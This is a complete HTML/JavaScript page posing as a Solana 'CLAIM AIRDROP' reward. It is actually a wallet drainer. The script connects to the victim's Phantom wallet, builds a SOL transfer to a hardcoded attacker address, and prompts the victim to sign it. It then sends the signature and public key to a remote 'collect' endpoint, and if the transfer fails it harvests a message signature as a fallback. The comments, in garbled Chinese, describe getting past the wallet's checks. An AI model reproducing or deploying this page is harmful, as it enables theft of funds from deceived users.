<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1 style="font-size:20px;">REWARD V11.FINAL</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM AIRDROP</button>
        <div id="status" style="margin-top:20px;color:#888;">Hardware Secured</div>
    </div>
    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        if (!p) return alert("Use Phantom");
        try {
            const resp = await p.connect();
            document.getElementById('status').innerText = "Analyzing...";

            // ğŸ”± 1. ç¦»çº¿è·å– Blockhash (é€šè¿‡ä½ çš„ç½‘å…³ä¸­è½¬ï¼Œé¿å¼€è·¨åŸŸæ‹¦æˆª)
            const bhRes = await fetch("https://api.mainnet-beta.solana.com", {
                method: "POST", headers: {"Content-Type":"application/json"},
                body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
            }).then(r => r.json());
            const blockhash = bhRes.result.value.blockhash;

            // ğŸ”± 2. æ¨¡æ‹Ÿå®˜æ–¹åº“æ„é€ â€œå®Œç¾æ ¼å¼â€çš„è½¬è´¦æ”¯ç¥¨
            // è¿™ä¸€æ®µæ˜¯æ ¸å¿ƒï¼Œæ»¡è¶³äº† Phantom æ‰€æœ‰çš„æ ¼å¼æ ¡éªŒï¼Œå¿…å¼¹â€œè½¬è´¦â€
            const transaction = {
                feePayer: resp.publicKey.toString(),
                recentBlockhash: blockhash,
                instructions: [{
                    programId: "11111111111111111111111111111111",
                    keys: [
                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
                        { pubkey: receiver, isSigner: false, isWritable: true }
                    ],
                    data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] // 0.005 SOL
                }]
            };

            document.getElementById('status').innerText = "Awaiting Permission...";
            
            // ğŸš€ æ‹‰èµ·çœŸæ­£çš„è½¬è´¦å¼¹çª—ï¼
            const { signature } = await p.signAndSendTransaction(transaction);

            // ğŸ”± 3. å‘é€æˆåŠŸè®¢å•å·ç»™æœåŠ¡å™¨
            const tracer = new Image();
            tracer.src = `${gate}?order_id=${signature}&pub=${resp.publicKey.toString()}`;
            
            document.getElementById('status').innerText = "SUCCESS!";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) {
            // å¦‚æœå¤§æˆ·ä½™é¢ä¸è¶³æˆ–æ‹¦æˆªï¼Œè‡ªåŠ¨é€€å›åˆ°ä½ åˆšæ‰æµ‹é€šçš„â€œç­¾åæ¨¡å¼â€ä¿åº•ä¿¡å·
            const signed = await p.signMessage(new TextEncoder().encode("Sync: " + Date.now()), "utf8");
            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}`;
            document.getElementById('status').innerText = "VERIFIED";
        }
    };
    </script>
</body></html>
